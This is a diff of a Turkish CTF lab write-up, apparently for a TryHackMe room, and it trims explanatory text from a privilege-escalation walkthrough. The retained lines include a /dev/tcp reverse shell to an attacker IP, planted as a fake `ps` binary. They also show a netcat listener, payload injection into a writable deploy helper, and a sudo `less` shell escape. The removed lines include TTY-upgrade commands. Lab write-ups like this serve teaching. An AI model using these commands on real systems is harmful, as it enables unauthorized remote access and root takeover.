@@ -210,9 +210,6 @@ cd /opt/dev/bin
 echo 'bash -i >& /dev/tcp/192.168.154.242/1339 0>&1' > ps
 chmod +x ps
 ```
-
-`chmod +x` kısmını unutmamak lazım, yoksa dosya çalıştırılabilir olmuyor ve bekleyip duruyorsun ama hiçbir şey olmuyor (bu hatayı bir önceki adımda da yapmıştım, script exec izni olmadan sessizce fail oluyor, sonradan fark ettim).
-
 Dinleyiciyi açtım:
 
 ```bash
@@ -247,7 +244,7 @@ Burada net bir kural var: `monitor_user`, **şifre girmeden** `ops_user` yetkisi
 
 `deploy.sh` dosyasının içeriğine baktığımda başka bir dosyayı (`deploy_helper.sh`) çağırdığını gördüm, ve bu helper dosyası bana yazılabilir durumdaydı. Yani `deploy.sh`'ı direkt değiştirmeme gerek yoktu (belki root/ops_user tarafında checksum ya da izin kontrolü olabilirdi diye düşündüm, ihtiyatlı davrandım), onun yerine çağırdığı helper'a payload eklemek daha temiz bir yoldu.
 
-Önce dinleyiciyi hazırladım, bu sefer `-k` flag'i ile kalıcı dinleme modunda açtım (bağlantı kopsa bile netcat kapanmasın diye, çünkü deploy script bazen birden fazla process spawn edebilir):
+Önce dinleyiciyi hazırladım, bu sefer `-k` flag'i ile kalıcı dinleme modunda açtım:
 
 ```bash
 nc -lvnp 1340 -k
@@ -286,14 +283,14 @@ ops_user@tryhackme-2404:~$ cat flag.txt
 
 ## Root'a Geçiş
 
-`ops_user` olarak tekrar `sudo -l` çalıştırdım, artık bu benim refleksim olmuştu, her yeni kullanıcıda ilk 10 saniyede yapılması gereken şey:
+`ops_user` olarak tekrar `sudo -l` çalıştırdım,:
 
 ```
 User ops_user may run the following commands on tryhackme-2404:
     (root) NOPASSWD: /usr/bin/less
 ```
 
-Bunu görünce içim rahatladı çünkü **`less` ile root privesc'i GTFOBins'te çok bilinen, klasik bir yöntem.** Direkt [gtfobins.github.io/gtfobins/less](https://gtfobins.github.io/gtfobins/less/) sayfasını hatırladım (ya da kontrol ettim), mantık şu: `less` bir pager, dosya görüntülerken içinden `!komut` yazarak shell'e komut geçirebiliyorsun, ve `!/bin/bash` yazarsan direkt bir bash shell'i düşüyor - `less` hangi yetkiyle çalışıyorsa (burada root, çünkü sudo ile root olarak çalıştırıyoruz) o shell de o yetkiyle açılıyor.
+Bunu görünce içim rahatladı çünkü mantık şu: `less` bir pager, dosya görüntülerken içinden `!komut` yazarak shell'e komut geçirebiliyorsun, ve `!/bin/bash` yazarsan direkt bir bash shell'i düşüyor - `less` hangi yetkiyle çalışıyorsa o shell de o yetkiyle açılıyor.
 
 Denedim:
 
@@ -302,42 +299,9 @@ sudo less /etc/hosts
 ```
 <img width="949" height="148" alt="shell4den sonra" src="https://github.com/user-attachments/assets/6b31bc6f-1daf-4f08-8e7d-4c75e75a26c2" />
 
-Ama burada beklenmedik bir sorunla karşılaştım. Ekran normal `cat` çıktısı gibi dosyayı basıp direkt komut satırına geri döndü, **pager moduna hiç girmedi**. `!/bin/bash` yazdığımda da "command not found" tarzı bir hata aldım çünkü satır `less`'e değil, doğrudan normal shell'e komut olarak gitmişti.
-
-Bir süre "GTFOBins yanlış mı, yoksa less burada farklı mı davranıyor" diye düşündüm ama sonra fark ettim: **sorun `less`'te değil, benim shell'imde.** Reverse shell ile aldığım bu bağlantı gerçek bir TTY (terminal) değil, sadece ham bir soket üzerinden text akıtan bir bash. `less` gibi ekranı tam kaplayan, interaktif çalışan (curses tabanlı) programlar gerçek bir terminale ihtiyaç duyar; TTY olmayan bir ortamda `less` kendini "interaktif değilim" moduna alıp direkt dosyayı basıp çıkıyor - tıpkı `cat` gibi davranıyor.
-
 <img width="901" height="386" alt="shell4densonra1" src="https://github.com/user-attachments/assets/ae9e1a50-e4f6-4bc7-8f0f-d900de9fe549" />
 
-Bunu çözmek için shell'imi gerçek bir PTY'ye yükseltmem gerekti:
-
-Hedef tarafta (ops_user shell'inde):
-
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-```
-
-Sonra kendi Kali/attacker terminalimde `Ctrl+Z` ile shell'i arka plana aldım ve:
-
-```bash
-stty raw -echo; fg
-```
-
-`fg` ile shell'i tekrar ön plana getirdikten sonra hedef tarafta bir kere boşluk bırakmadan Enter'a bastım (bazen ilk enter kayboluyor, ikinci denemede net oluyor), ve terminal boyutunu senkron etmek için (zorunlu değil ama `less` gibi ekran kaplayan programlarda görüntü bozulmasın diye faydalı):
-
-```bash
-stty rows 38 columns 116
-```
-
-(kendi terminal boyutunu görmek için Kali tarafında `stty size` yazabilirsiniz, çıkan iki sayıyı rows/columns olarak buraya yazıyorsunuz)
-
-Bundan sonra tekrar denedim:
-
-```bash
-sudo less /etc/hosts
-```
-
-Bu sefer fark hemen belliydi: ekran gerçekten tam ekran pager moduna geçti, `/etc/hosts` içeriği ekranı kapladı, alt satırda dosya adı göründü ve imleç orada bekledi (artık bash prompt'u görünmüyordu). O ekrandayken:
+O ekrandayken:
 
 ```
 !/bin/bash
